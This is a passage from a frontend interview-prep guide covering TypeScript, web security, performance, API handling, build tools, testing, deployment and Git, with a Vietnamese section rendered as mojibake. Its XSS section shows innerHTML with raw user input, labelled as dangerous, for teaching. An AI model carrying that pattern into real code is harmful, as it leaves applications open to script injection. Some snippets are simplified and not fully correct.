type IsString<T> = T extends string ? true : false;
type A = IsString<string>; // true
type B = IsString<number>; // false

// Real-world: Different return based on input
type ApiResponse<T extends 'json' | 'text'> = 
  T extends 'json' ? object : string;

async function fetch<T extends 'json' | 'text'>(
  url: string,
  type: T
): Promise<ApiResponse<T>> {
  // Implementation
}

const jsonData = await fetch('/api', 'json'); // object type
const textData = await fetch('/api', 'text'); // string type

// 4. Template Literal Types
type EventName = 'click' | 'focus' | 'blur';
type HandlerName = `on${Capitalize<EventName>}`; 
// 'onClick' | 'onFocus' | 'onBlur'

// 5. Discriminated Unions
type Success = { status: 'success'; data: User };
type Error = { status: 'error'; error: string };
type Result = Success | Error;

function handle(result: Result) {
  if (result.status === 'success') {
    console.log(result.data); // TS knows it's Success
  } else {
    console.log(result.error); // TS knows it's Error
  }
}
```

---

### **ğŸ”’ 4. SECURITY & PERFORMANCE**

#### **4.1. Web Security (Q38 - CRITICAL)**

**Q38: XSS, CSRF, CSP, JWT**
```typescript
// 1. XSS (Cross-Site Scripting) Prevention
// âŒ Dangerous
element.innerHTML = userInput; // Can inject <script>
<div dangerouslySetInnerHTML={{ __html: userInput }} />

// âœ… Safe
element.textContent = userInput; // Auto-escapes
<div>{userInput}</div> // React auto-escapes
import DOMPurify from 'dompurify';
const clean = DOMPurify.sanitize(userInput);

// 2. CSRF (Cross-Site Request Forgery) Prevention
// âœ… CSRF Token
<form>
  <input type="hidden" name="csrf_token" value={token} />
</form>

// âœ… SameSite Cookies
Set-Cookie: session=abc; SameSite=Strict; HttpOnly; Secure

// âœ… Verify Origin header
if (req.headers.origin !== 'https://myapp.com') {
  return res.status(403);
}

// 3. Content Security Policy (CSP)
// Prevent inline scripts, eval(), unsafe sources
Content-Security-Policy: 
  default-src 'self'; 
  script-src 'self' 'nonce-random123';
  style-src 'self' 'unsafe-inline';

// 4. JWT Best Practices
// âœ… Short expiry (15 min access, 7 days refresh)
// âœ… Store in memory or httpOnly cookie (NOT localStorage)
// âœ… Refresh token rotation
// âœ… Verify signature server-side
// âœ… Use HTTPS only

const accessToken = jwt.sign(
  { userId: user.id },
  SECRET,
  { expiresIn: '15m' }
);

// 5. Security Headers
Strict-Transport-Security: max-age=31536000
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
X-XSS-Protection: 1; mode=block
Referrer-Policy: no-referrer
```

---

#### **4.2. Performance Optimization (Q39-Q42)**

**Q39: Loading Optimization**
```typescript
// 1. Code Splitting
// Route-based
const Dashboard = lazy(() => import('./Dashboard'));

// Component-based
const HeavyChart = lazy(() => import('./Chart'));

// Library-based (webpack magic comments)
import(/* webpackChunkName: "lodash" */ 'lodash');

// 2. Lazy Loading Images
<img loading="lazy" src="image.jpg" />

// Intersection Observer (custom)
const observer = new IntersectionObserver(entries => {
  entries.forEach(entry => {
    if (entry.isIntersecting) {
      entry.target.src = entry.target.dataset.src;
    }
  });
});

// 3. Prefetching/Preloading
<link rel="prefetch" href="/next-page.js" /> // Low priority
<link rel="preload" href="/critical.js" as="script" /> // High priority
<link rel="dns-prefetch" href="//api.example.com" />
<link rel="preconnect" href="//api.example.com" />

// 4. Bundle Optimization
// Tree shaking (remove unused code)
import { debounce } from 'lodash-es'; // âœ… ES modules
import debounce from 'lodash/debounce'; // âœ… Direct import
import _ from 'lodash'; // âŒ Imports ALL lodash

// Analyze bundle
npm run build -- --analyze (webpack-bundle-analyzer)
```

**Q40-Q41: Web Vitals & Lighthouse**
```typescript
// Core Web Vitals (Google ranking factors)
LCP (Largest Contentful Paint) < 2.5s
  - Optimize: Image size, server response, critical CSS

FID (First Input Delay) < 100ms
  - Optimize: Reduce JS execution, code splitting

CLS (Cumulative Layout Shift) < 0.1
  - Optimize: Reserve space (width/height), avoid dynamic content

// Measure Web Vitals
import { getCLS, getFID, getFCP, getLCP, getTTFB } from 'web-vitals';

getCLS(console.log);
getFID(console.log);
getLCP(console.log);

// Lighthouse CI (continuous monitoring)
npm install -g @lhci/cli
lhci autorun --collect.numberOfRuns=3

// Performance budget
{
  "budgets": [{
    "resourceSizes": [{
      "resourceType": "script",
      "budget": 200 // KB
    }]
  }]
}
```

**Q42: Bundle Analysis**
```typescript
// Webpack Bundle Analyzer
const BundleAnalyzerPlugin = require('webpack-bundle-analyzer').BundleAnalyzerPlugin;

module.exports = {
  plugins: [
    new BundleAnalyzerPlugin()
  ]
};

// Vite: rollup-plugin-visualizer
import { visualizer } from 'rollup-plugin-visualizer';

export default {
  plugins: [visualizer()]
};

// Analyze output:
1. Find large dependencies (moment.js â†’ day.js)
2. Identify duplicate code (deduplication)
3. Check tree-shaking (unused exports)
4. Measure gzip size (actual transfer)

// Tools:
- webpack-bundle-analyzer
- source-map-explorer
- bundlephobia.com (check npm package size)
```

---

### **ğŸŒ 5. API & DATA FETCHING**

#### **5.1. Error Handling (Q43 - CRITICAL)**

**Q43: Robust API Error Handling**
```typescript
// 1. Retry with Exponential Backoff
async function fetchWithRetry(url, options = {}, maxRetries = 3) {
  for (let i = 0; i < maxRetries; i++) {
    try {
      const response = await fetch(url, options);
      
      // Retry on server errors (500, 502, 503, 504)
      if (response.status >= 500 && i < maxRetries - 1) {
        const delay = Math.pow(2, i) * 1000; // 1s, 2s, 4s
        await sleep(delay);
        continue;
      }
      
      // Don't retry client errors (400, 401, 404)
      if (!response.ok) {
        throw new Error(`HTTP ${response.status}`);
      }
      
      return response;
    } catch (error) {
      if (i === maxRetries - 1) throw error;
      await sleep(Math.pow(2, i) * 1000);
    }
  }
}

// 2. Global Error Handler (Axios Interceptors)
axios.interceptors.response.use(
  response => response,
  async error => {
    const originalRequest = error.config;
    
    // Token expired â†’ Refresh
    if (error.response?.status === 401 && !originalRequest._retry) {
      originalRequest._retry = true;
      const newToken = await refreshToken();
      originalRequest.headers.Authorization = `Bearer ${newToken}`;
      return axios(originalRequest);
    }
    
    // Network error â†’ Retry
    if (!error.response && !originalRequest._retry) {
      originalRequest._retry = true;
      await sleep(1000);
      return axios(originalRequest);
    }
    
    // Log to monitoring
    Sentry.captureException(error);
    
    // Show user-friendly message
    toast.error(getErrorMessage(error));
    
    return Promise.reject(error);
  }
);

// 3. Error Boundary + Error Tracking
function getErrorMessage(error) {
  if (error.response) {
    // Server responded with error
    return error.response.data.message || 'Server error';
  } else if (error.request) {
    // Request made but no response
    return 'Network error. Please check your connection.';
  } else {
    // Request setup error
    return error.message || 'Something went wrong';
  }
}

// 4. Circuit Breaker Pattern
class CircuitBreaker {
  constructor(threshold = 5, timeout = 60000) {
    this.failureCount = 0;
    this.threshold = threshold;
    this.timeout = timeout;
    this.state = 'CLOSED'; // CLOSED, OPEN, HALF_OPEN
  }
  
  async execute(fn) {
    if (this.state === 'OPEN') {
      if (Date.now() - this.openedAt > this.timeout) {
        this.state = 'HALF_OPEN';
      } else {
        throw new Error('Circuit breaker is OPEN');
      }
    }
    
    try {
      const result = await fn();
      this.onSuccess();
      return result;
    } catch (error) {
      this.onFailure();
      throw error;
    }
  }
  
  onSuccess() {
    this.failureCount = 0;
    this.state = 'CLOSED';
  }
  
  onFailure() {
    this.failureCount++;
    if (this.failureCount >= this.threshold) {
      this.state = 'OPEN';
      this.openedAt = Date.now();
    }
  }
}
```

---

#### **5.2. HTTP Clients (Q44-Q48)**

**Q44: Axios Advanced**
```typescript
// 1. Instance with defaults
const api = axios.create({
  baseURL: 'https://api.example.com',
  timeout: 10000,
  headers: { 'Content-Type': 'application/json' }
});

// 2. Request/Response Interceptors
api.interceptors.request.use(config => {
  const token = getToken();
  if (token) {
    config.headers.Authorization = `Bearer ${token}`;
  }
  return config;
});

api.interceptors.response.use(
  response => response.data, // Auto unwrap
  error => Promise.reject(error)
);

// 3. Request Cancellation
const controller = new AbortController();
axios.get('/api/data', { signal: controller.signal });
controller.abort(); // Cancel request

// 4. Progress Tracking
axios.post('/upload', formData, {
  onUploadProgress: (progressEvent) => {
    const percent = (progressEvent.loaded / progressEvent.total) * 100;
    setProgress(percent);
  }
});

// 5. Concurrent Requests
const [users, posts] = await Promise.all([
  api.get('/users'),
  api.get('/posts')
]);
```

**Q45: WebSocket Real-time**
```typescript
// 1. Basic WebSocket
const ws = new WebSocket('wss://api.example.com');

ws.onopen = () => console.log('Connected');
ws.onmessage = (event) => {
  const data = JSON.parse(event.data);
  updateUI(data);
};
ws.onerror = (error) => console.error(error);
ws.onclose = () => console.log('Disconnected');

// Send data
ws.send(JSON.stringify({ type: 'subscribe', channel: 'prices' }));

// 2. Auto Reconnection
class WebSocketClient {
  constructor(url) {
    this.url = url;
    this.reconnectDelay = 1000;
    this.maxReconnectDelay = 30000;
    this.connect();
  }
  
  connect() {
    this.ws = new WebSocket(this.url);
    
    this.ws.onopen = () => {
      console.log('Connected');
      this.reconnectDelay = 1000; // Reset delay
    };
    
    this.ws.onclose = () => {
      console.log('Disconnected, reconnecting...');
      setTimeout(() => {
        this.reconnectDelay = Math.min(
          this.reconnectDelay * 2,
          this.maxReconnectDelay
        );
        this.connect();
      }, this.reconnectDelay);
    };
    
    this.ws.onmessage = (event) => this.handleMessage(event);
  }
  
  send(data) {
    if (this.ws.readyState === WebSocket.OPEN) {
      this.ws.send(JSON.stringify(data));
    }
  }
}

// 3. React Hook for WebSocket
function useWebSocket(url) {
  const [data, setData] = useState(null);
  const [isConnected, setIsConnected] = useState(false);
  const wsRef = useRef(null);
  
  useEffect(() => {
    const ws = new WebSocket(url);
    wsRef.current = ws;
    
    ws.onopen = () => setIsConnected(true);
    ws.onclose = () => setIsConnected(false);
    ws.onmessage = (event) => setData(JSON.parse(event.data));
    
    return () => ws.close();
  }, [url]);
  
  const send = useCallback((data) => {
    wsRef.current?.send(JSON.stringify(data));
  }, []);
  
  return { data, isConnected, send };
}
```

**Q48: GraphQL**
```typescript
// 1. Query
const GET_USER = gql`
  query GetUser($id: ID!) {
    user(id: $id) {
      id
      name
      posts {
        id
        title
      }
    }
  }
`;

const { data, loading, error } = useQuery(GET_USER, {
  variables: { id: '1' }
});

// 2. Mutation
const CREATE_POST = gql`
  mutation CreatePost($input: PostInput!) {
    createPost(input: $input) {
      id
      title
    }
  }
`;

const [createPost] = useMutation(CREATE_POST);
await createPost({
  variables: { input: { title: 'New Post' } }
});

// 3. Real-time with Subscriptions
const POST_ADDED = gql`
  subscription OnPostAdded {
    postAdded {
      id
      title
    }
  }
`;

const { data } = useSubscription(POST_ADDED);

// 4. Cache Management
const client = new ApolloClient({
  cache: new InMemoryCache({
    typePolicies: {
      Query: {
        fields: {
          posts: {
            merge(existing, incoming) {
              return incoming; // Replace strategy
            }
          }
        }
      }
    }
  })
});
```

---

### **ğŸ”§ 6. BUILD TOOLS & DEVOPS**

#### **6.1. Module Systems (Q50-Q55)**

**Q50-Q51: CommonJS vs ES Modules**
```typescript
// CommonJS (Node.js default)
// Synchronous loading
const express = require('express');
module.exports = { app };

// ES Modules (Modern standard)
// Asynchronous loading, tree-shakable
import express from 'express';
export { app };
export default app;

// Dynamic imports
const module = await import('./module.js');

// Key differences:
CommonJS: Sync, runtime, copy of value, require()
ES Modules: Async, static analysis, live binding, import
```

**Q52-Q54: Webpack & Vite**
```typescript
// Webpack - Bundle-based (slower, powerful)
module.exports = {
  entry: './src/index.js',
  output: {
    filename: 'bundle.js',
    path: path.resolve(__dirname, 'dist')
  },
  module: {
    rules: [
      { test: /\.tsx?$/, use: 'ts-loader' },
      { test: /\.css$/, use: ['style-loader', 'css-loader'] }
    ]
  },
  plugins: [
    new HtmlWebpackPlugin(),
    new MiniCssExtractPlugin()
  ],
  optimization: {
    splitChunks: { chunks: 'all' }
  }
};

// Vite - Native ESM (faster, simpler)
export default {
  plugins: [react()],
  build: {
    rollupOptions: {
      output: {
        manualChunks: {
          vendor: ['react', 'react-dom']
        }
      }
    }
  }
};

// When to use:
Webpack: Complex config, legacy projects, custom loaders
Vite: New projects, speed priority, simple setup
```

---

#### **6.2. Micro-frontends (Q56)**

**Q56: Module Federation (CRITICAL)**
```typescript
// Host app (shell)
const { ModuleFederationPlugin } = require('webpack').container;

module.exports = {
  plugins: [
    new ModuleFederationPlugin({
      name: 'host',
      remotes: {
        app1: 'app1@http://localhost:3001/remoteEntry.js',
        app2: 'app2@http://localhost:3002/remoteEntry.js'
      },
      shared: {
        react: { singleton: true },
        'react-dom': { singleton: true }
      }
    })
  ]
};

// Remote app (micro-frontend)
new ModuleFederationPlugin({
  name: 'app1',
  filename: 'remoteEntry.js',
  exposes: {
    './Button': './src/Button',
    './App': './src/App'
  },
  shared: {
    react: { singleton: true },
    'react-dom': { singleton: true }
  }
})

// Consume remote
const RemoteButton = React.lazy(() => import('app1/Button'));

<Suspense fallback="Loading...">
  <RemoteButton />
</Suspense>

// Benefits:
âœ… Independent deployment
âœ… Team autonomy
âœ… Shared dependencies (no duplication)
âœ… Runtime integration

// Challenges:
âŒ Version conflicts
âŒ Complex debugging
âŒ Network latency
âŒ Shared state management
```

---

#### **6.3. Testing (Q60 - CRITICAL)**

**Q60: Testing Strategy**
```typescript
// Testing Pyramid:
//        /\
//       /E2E\     10% - Slow, expensive, critical flows
//      /------\
//     /Integr.\   20% - Medium, component interactions
//    /----------\
//   /   Unit    \  70% - Fast, cheap, isolated logic
//  /--------------\

// 1. Unit Tests (Jest + React Testing Library)
import { render, screen, fireEvent } from '@testing-library/react';

test('counter increments', () => {
  render(<Counter />);
  const button = screen.getByRole('button');
  fireEvent.click(button);
  expect(screen.getByText('1')).toBeInTheDocument();
});

// Test custom hook
import { renderHook, act } from '@testing-library/react';

test('useCounter increments', () => {
  const { result } = renderHook(() => useCounter());
  act(() => {
    result.current.increment();
  });
  expect(result.current.count).toBe(1);
});

// 2. Integration Tests (MSW for API mocking)
import { rest } from 'msw';
import { setupServer } from 'msw/node';

const server = setupServer(
  rest.get('/api/users', (req, res, ctx) => {
    return res(ctx.json([{ id: 1, name: 'Alice' }]));
  })
);

beforeAll(() => server.listen());
afterEach(() => server.resetHandlers());
afterAll(() => server.close());

// 3. E2E Tests (Cypress / Playwright)
// Cypress
describe('Login flow', () => {
  it('logs in successfully', () => {
    cy.visit('/login');
    cy.get('[data-testid="email"]').type('user@example.com');
    cy.get('[data-testid="password"]').type('password');
    cy.get('button[type="submit"]').click();
    cy.url().should('include', '/dashboard');
  });
});

// Playwright
test('login flow', async ({ page }) => {
  await page.goto('/login');
  await page.fill('[data-testid="email"]', 'user@example.com');
  await page.fill('[data-testid="password"]', 'password');
  await page.click('button[type="submit"]');
  await expect(page).toHaveURL(/dashboard/);
});

// 4. Visual Regression (Percy, Chromatic)
import percySnapshot from '@percy/cypress';
cy.percySnapshot('Homepage');

// Coverage targets:
// Unit: 80%+ (statements, branches)
// Integration: Key flows (login, checkout, forms)
// E2E: Happy paths only (slow, expensive)
```

---

#### **6.4. CI/CD & Deployment (Q62-Q66)**

**Q62: Docker for Frontend**
```dockerfile
# Multi-stage build (optimize image size)
# Stage 1: Build
FROM node:18-alpine AS builder
WORKDIR /app
COPY package*.json ./
RUN npm ci
COPY . .
RUN npm run build

# Stage 2: Production
FROM nginx:alpine
COPY --from=builder /app/dist /usr/share/nginx/html
COPY nginx.conf /etc/nginx/nginx.conf
EXPOSE 80
CMD ["nginx", "-g", "daemon off;"]

# .dockerignore
node_modules
.git
.env
*.md
```

**Q63: Nginx Configuration**
```nginx
server {
  listen 80;
  server_name example.com;
  root /usr/share/nginx/html;
  index index.html;
  
  # SPA routing (fallback to index.html)
  location / {
    try_files $uri $uri/ /index.html;
  }
  
  # Cache static assets (1 year)
  location /static/ {
    expires 1y;
    add_header Cache-Control "public, immutable";
  }
  
  # API proxy (avoid CORS)
  location /api/ {
    proxy_pass http://backend:3000;
    proxy_set_header Host $host;
    proxy_set_header X-Real-IP $remote_addr;
  }
  
  # Gzip compression
  gzip on;
  gzip_types text/plain text/css application/json application/javascript;
  
  # Security headers
  add_header X-Frame-Options "DENY";
  add_header X-Content-Type-Options "nosniff";
  add_header X-XSS-Protection "1; mode=block";
}
```

**Q66: Git Workflows (CRITICAL)**
```bash
# Git Flow (Feature â†’ Develop â†’ Release â†’ Main)
git checkout -b feature/new-feature develop
# Work on feature
git checkout develop
git merge --no-ff feature/new-feature
git checkout -b release/1.2.0 develop
# Bug fixes in release
git checkout main
git merge --no-ff release/1.2.0
git tag -a v1.2.0

# GitHub Flow (Feature â†’ Main)
git checkout -b feature/new-feature
# Work on feature, push
git push origin feature/new-feature
# Create PR â†’ Review â†’ Merge to main
# main is ALWAYS deployable

# Trunk-Based Development (Short-lived branches â†’ Trunk)
git checkout -b feature/quick-fix
# Small changes (< 1 day)
git rebase main
git push
# Merge to main, deploy immediately

# Rebase vs Merge:
# Rebase (clean history, local branches only)
git rebase main
git push --force-with-lease

# Merge (preserve history, public branches)
git merge --no-ff feature/branch

# Conflict resolution:
git merge feature
# Fix conflicts
git add .
git commit

# Or abort:
git merge --abort

# Stash workflow:
git stash save "WIP: feature"
git checkout main
git checkout -
git stash pop
```

---

### **ğŸ“ 7. ADVANCED TOPICS**

#### **7.1. Authentication & Authorization (Q57-Q59)**

**Q57-Q58: JWT & OAuth 2.0**
```typescript
// JWT Structure: header.payload.signature
{
  "header": { "alg": "HS256", "typ": "JWT" },
  "payload": { "userId": "123", "exp": 1234567890 },
  "signature": "HMACSHA256(base64(header) + base64(payload), secret)"
}

// Implementation:
// 1. Login â†’ Get tokens
const { accessToken, refreshToken } = await login(credentials);
// Store accessToken in memory (React state/Zustand)
// Store refreshToken in httpOnly cookie

// 2. Axios interceptor (auto attach token)
api.interceptors.request.use(config => {
  const token = getAccessToken();
  if (token) {
    config.headers.Authorization = `Bearer ${token}`;
  }
  return config;
});

// 3. Token refresh on 401
api.interceptors.response.use(
  response => response,
  async error => {
    if (error.response?.status === 401) {
      const newToken = await refreshAccessToken();
      setAccessToken(newToken);
      error.config.headers.Authorization = `Bearer ${newToken}`;
      return api(error.config); // Retry original request
    }
    return Promise.reject(error);
  }
);

// 4. OAuth 2.0 Flow (Authorization Code)
// Step 1: Redirect to auth provider
window.location.href = 
  `https://auth.provider.com/authorize?
   client_id=YOUR_CLIENT_ID&
   redirect_uri=YOUR_CALLBACK&
   response_type=code&
   scope=openid profile email`;

// Step 2: Callback receives code
const code = new URLSearchParams(window.location.search).get('code');

// Step 3: Exchange code for token
const { access_token } = await fetch('/token', {
  method: 'POST',
  body: JSON.stringify({ code })
});

// Libraries:
// - Auth0, Firebase Auth, Supabase (managed)
// - NextAuth.js (self-hosted)
```

**Q59: Role-Based Access Control (RBAC)**
```typescript
// 1. Define permissions
const PERMISSIONS = {
  'user:read': ['admin', 'user'],
  'user:write': ['admin'],
  'post:read': ['admin', 'user', 'guest'],
  'post:write': ['admin', 'user'],
  'post:delete': ['admin']
};

// 2. Check permission
function hasPermission(userRole, permission) {
  return PERMISSIONS[permission]?.includes(userRole);
}

// 3. React component protection
function ProtectedRoute({ children, requiredPermission }) {
  const { user } = useAuth();
  
  if (!hasPermission(user.role, requiredPermission)) {
    return <Navigate to="/unauthorized" />;
  }
  
  return children;
}

// Usage:
<ProtectedRoute requiredPermission="post:write">
  <CreatePost />
</ProtectedRoute>

// 4. Conditional rendering
function PostActions({ post }) {
  const { user } = useAuth();
  
  return (
    <>
      {hasPermission(user.role, 'post:write') && (
        <EditButton post={post} />
      )}
      {hasPermission(user.role, 'post:delete') && (
        <DeleteButton post={post} />
      )}
    </>
  );
}
```

---

#### **7.2. Monitoring & Observability (Q65)**

**Q65: Error Tracking & Performance Monitoring**
```typescript
// 1. Sentry - Error tracking
import * as Sentry from "@sentry/react";

Sentry.init({
  dsn: "YOUR_DSN",
  integrations: [
    new Sentry.BrowserTracing(),
    new Sentry.Replay()
  ],
  tracesSampleRate: 0.1, // 10% of transactions
  replaysSessionSampleRate: 0.1,
  replaysOnErrorSampleRate: 1.0 // 100% on errors
});

// Capture custom errors
try {
  processPayment();
} catch (error) {
  Sentry.captureException(error, {
    tags: { section: 'payment' },
    extra: { userId: user.id }
  });
}

// 2. LogRocket - Session replay
import LogRocket from 'logrocket';

LogRocket.init('app-id');
LogRocket.identify(user.id, {
  name: user.name,
  email: user.email
});

// 3. Google Analytics - User behavior
import ReactGA from 'react-ga4';

ReactGA.initialize('G-XXXXXXXXXX');
ReactGA.send({ hitType: "pageview", page: window.location.pathname });

// Track custom events
ReactGA.event({
  category: 'User',
  action: 'Clicked CTA',
  label: 'Homepage Hero'
});

// 4. Custom Performance Monitoring
const metric = performance.measure('apiCall', 'start', 'end');
console.log(`API call took ${metric.duration}ms`);

// Real User Monitoring (RUM)
new PerformanceObserver((list) => {
  list.getEntries().forEach(entry => {
    if (entry.entryType === 'navigation') {
      console.log('Page load:', entry.loadEventEnd - entry.fetchStart);
    }
  });
}).observe({ entryTypes: ['navigation', 'resource'] });
```

---

## **ğŸ“‹ II. PHÃ‚N TÃCH Má»¨C Äá»˜ CÃ‚U Há»I**

### **ğŸ”´ CRITICAL (Pháº£i thuá»™c náº±m lÃ²ng - 15 cÃ¢u)**

**ÄÃ¢y lÃ  nhá»¯ng cÃ¢u KHÃ”NG THá»‚ SAI khi phá»ng váº¥n Senior:**

1. **Q4: Event Loop** - Giáº£i thÃ­ch Ä‘Æ°á»£c Microtask vs Macrotask, setTimeout 0, Promise timing
2. **Q5: Closures** - Hiá»ƒu sÃ¢u vá» lexical scope, memory leak, practical use cases
3. **Q11: Arrow Functions vs Regular** - this binding, use cases, khi nÃ o KHÃ”NG dÃ¹ng arrow
4. **Q14: Promises** - async/await, error handling, Promise.all/race/allSettled
5. **Q22: React Performance** - useMemo, useCallback, React.memo, virtualization
6. **Q23: State Management** - So sÃ¡nh Redux/Zustand/Jotai, khi nÃ o dÃ¹ng gÃ¬
7. **Q26: React Hooks** - Custom hooks, rules, useEffect cleanup, dependencies
8. **Q31: SSR vs CSR vs SSG** - Hiá»ƒu rÃµ trade-offs, khi nÃ o dÃ¹ng Next.js
9. **Q38: Security** - XSS, CSRF, CSP, JWT best practices
10. **Q39: Performance Optimization** - Lazy loading, code splitting, bundle size
11. **Q43: API Error Handling** - Retry logic, exponential backoff, global error handler
12. **Q49: TypeScript Advanced** - Generics, utility types, conditional types
13. **Q56: Module Federation** - Micro-frontends architecture, shared dependencies
14. **Q60: Testing Strategy** - Unit vs Integration vs E2E, testing pyramid
15. **Q66: Git Workflows** - Git flow, conflict resolution, rebase vs merge

**ğŸ’¡ Chiáº¿n lÆ°á»£c:**
- Tráº£ lá»i vá»›i **vÃ­ dá»¥ thá»±c táº¿ tá»« dá»± Ã¡n Ä‘Ã£ lÃ m**
- Äá» cáº­p Ä‘áº¿n **trade-offs** (khÃ´ng cÃ³ giáº£i phÃ¡p hoÃ n háº£o)
- Show **performance impact** (vÃ­ dá»¥: tá»« 3s â†’ 800ms)
- NÃªu **best practices** vÃ  lÃ½ do táº¡i sao

---

### **ğŸŸ¡ IMPORTANT (Cáº§n hiá»ƒu rÃµ - 25 cÃ¢u)**

**CÃ¢u há»i nÃ y phÃ¢n biá»‡t Mid-level vÃ  Senior:**

- **Q1-Q3**: Data types, Type Coercion, Equality - Ná»n táº£ng nhÆ°ng pháº£i tráº£ lá»i **CHÃNH XÃC**
- **Q6**: Hoisting & TDZ - Giáº£i thÃ­ch Ä‘Æ°á»£c táº¡i sao `let/const` an toÃ n hÆ¡n `var`
- **Q7-Q10**: Spread/Rest, Destructuring, Template Literals, Modules - ES6+ fundamentals
- **Q15-Q21**: DOM Manipulation, Event Delegation, Virtual DOM - Core web concepts
- **Q24-Q25**: React Context, Server Components - Hiá»ƒu Ä‘Æ°á»£c architecture patterns
- **Q27-Q30**: Error Boundaries, Code Splitting, Component Patterns - Production-ready code
- **Q32-Q37**: Type Checking, TypeScript basics - Static typing trong large codebase
- **Q40-Q42**: Web Vitals, Lighthouse, Bundle Analysis - Performance metrics
- **Q44-Q48**: Axios, WebSocket, GraphQL - API communication
- **Q50-Q55**: Module Systems, Webpack, Vite - Build tools
- **Q57-Q59**: Authentication, Authorization - Security fundamentals
- **Q61-Q65**: Testing, CI/CD, Monitoring - DevOps for Frontend

**ğŸ’¡ Chiáº¿n lÆ°á»£c:**
- Äá»«ng chá»‰ nÃ³i **"cÃ¡i gÃ¬"** (what) mÃ  nÃ³i **"táº¡i sao"** (why)
- So sÃ¡nh **multiple approaches** (vÃ­ dá»¥: Context vs Redux vs Zustand)
- NÃªu **khi nÃ o dÃ¹ng** vÃ  **khi nÃ o KHÃ”NG dÃ¹ng**
- Show **evolution of thinking** (vÃ­ dá»¥: tá»« Redux â†’ Zustand vÃ¬ Ä‘Æ¡n giáº£n hÆ¡n)

---

### **ğŸŸ¢ GOOD-TO-KNOW (Bonus points - 26 cÃ¢u)**

**KhÃ´ng báº¯t buá»™c nhÆ°ng táº¡o áº¥n tÆ°á»£ng máº¡nh:**

- **Q12-Q13**: Optional Chaining, Nullish Coalescing - Modern syntax
- **Q45-Q46**: SSE, WebRTC - Real-time communication
- **Q47**: Service Workers - PWA capabilities
- **Q62-Q64**: Docker, Nginx, CDN - Deployment knowledge
- CÃ¡c cÃ¢u cÃ²n láº¡i vá» **advanced patterns**, **optimization techniques**

**ğŸ’¡ Chiáº¿n lÆ°á»£c:**
- Náº¿u cÃ³ kinh nghiá»‡m thá»±c táº¿ â†’ **NHáº¤N Máº NH**
- Náº¿u chÆ°a cÃ³ â†’ tráº£ lá»i **"I haven't used it in production, but I understand..."**
- Äá»«ng **nÃ³i dá»‘i** hoáº·c **pretend to know** - Senior cáº§n **honesty**

---

## **ğŸ“Š II. CÃCH TRáº¢ Lá»œI Cáº¤P Äá»˜ SENIOR**

### **ğŸ¯ 1. Framework Tráº£ Lá»i (STAR Method - Modified)**

**S - Situation (TÃ¬nh huá»‘ng):**
- "Trong dá»± Ã¡n X, chÃºng tÃ´i gáº·p váº¥n Ä‘á» Y..."

**T - Technical Challenge (ThÃ¡ch thá»©c ká»¹ thuáº­t):**
- "Ban Ä‘áº§u tÃ´i thá»­ approach A nhÆ°ng gáº·p váº¥n Ä‘á» Z..."

**A - Action & Decision (HÃ nh Ä‘á»™ng & Quyáº¿t Ä‘á»‹nh):**
- "Sau khi research vÃ  benchmark, tÃ´i quyáº¿t Ä‘á»‹nh dÃ¹ng B vÃ¬..."
- "Trade-off: Æ°u Ä‘iá»ƒm X nhÆ°ng nhÆ°á»£c Ä‘iá»ƒm Y, phÃ¹ há»£p vá»›i use case nÃ y"

**R - Result & Learning (Káº¿t quáº£ & BÃ i há»c):**
- "Performance cáº£i thiá»‡n tá»« A â†’ B (metrics cá»¥ thá»ƒ)"
- "Náº¿u lÃ m láº¡i, tÃ´i sáº½ C vÃ¬ D..."

---

### **ğŸ¯ 2. VÃ­ Dá»¥ Tráº£ Lá»i Chuáº©n Senior**

#### **âŒ Mid-level Answer (Q4 - Event Loop):**
> "Event Loop lÃ  cÆ¡ cháº¿ JavaScript xá»­ lÃ½ async code. NÃ³ cÃ³ Call Stack, Callback Queue, vÃ  Event Loop sáº½ láº¥y tasks tá»« queue vÃ o stack khi stack rá»—ng."

#### **âœ… Senior-level Answer:**

> "Event Loop lÃ  core mechanism giÃºp JavaScript xá»­ lÃ½ async operations dÃ¹ single-threaded. TÃ´i sáº½ giáº£i thÃ­ch theo **thá»© tá»± Æ°u tiÃªn**:
>
> **1. Call Stack** - Synchronous code cháº¡y trÆ°á»›c (LIFO)
>
> **2. Microtask Queue** - Æ¯u tiÃªn cao:
> - `Promise.then/catch/finally`
> - `queueMicrotask()`
> - `MutationObserver`
> - Cháº¡y **NGAY SAU** call stack rá»—ng, **TRÆ¯á»šC** macrotasks
>
> **3. Macrotask Queue** - Æ¯u tiÃªn tháº¥p:
> - `setTimeout/setInterval`
> - `setImmediate` (Node.js)
> - I/O operations
> - Cháº¡y **Má»–I TASK Má»˜T**, rá»“i check microtasks láº¡i
>
> **Real-world impact tÃ´i Ä‘Ã£ gáº·p:**
> - Trong dá»± Ã¡n trading platform, chÃºng tÃ´i cáº§n update UI realtime khi nháº­n WebSocket data. Ban Ä‘áº§u dÃ¹ng `setTimeout(fn, 0)` nhÆ°ng bá»‹ delay 4-10ms vÃ¬ macrotask queue.
> - Chuyá»ƒn sang `Promise.resolve().then(fn)` â†’ update instant vÃ¬ microtask priority.
> - **Cáº£i thiá»‡n:** Response time tá»« ~15ms â†’ <2ms (measurable báº±ng Performance API).
>
> **Trade-off:**
> - Microtasks cÃ³ thá»ƒ **block rendering** náº¿u quÃ¡ nhiá»u (infinite loop trong Promise).
> - Giáº£i phÃ¡p: DÃ¹ng `requestIdleCallback()` cho non-critical updates.
>
> **Tools tÃ´i dÃ¹ng Ä‘á»ƒ debug:**
> - Chrome DevTools Performance tab (xem task duration)
> - `console.time()` Ä‘á»ƒ measure timing
> - React DevTools Profiler (component render blocking)

**ğŸ’¡ Äiá»ƒm khÃ¡c biá»‡t:**
- âœ… **PhÃ¢n loáº¡i rÃµ rÃ ng** priority (Microtask vs Macrotask)
- âœ… **VÃ­ dá»¥ thá»±c táº¿** (trading platform)
- âœ… **Metrics cá»¥ thá»ƒ** (15ms â†’ 2ms)
- âœ… **Trade-offs** (blocking rendering)
- âœ… **Tools** (Chrome DevTools, React Profiler)
- âœ… **Alternative solutions** (requestIdleCallback)

---

### **ğŸ¯ 3. Common Pitfalls - TrÃ¡nh Nhá»¯ng Lá»—i NÃ y**

#### **âŒ 1. Chá»‰ nÃ³i lÃ½ thuyáº¿t, khÃ´ng cÃ³ vÃ­ dá»¥ thá»±c táº¿:**
> "Closure lÃ  function cÃ³ access Ä‘áº¿n outer scope..." âŒ

#### **âœ… Fix:**
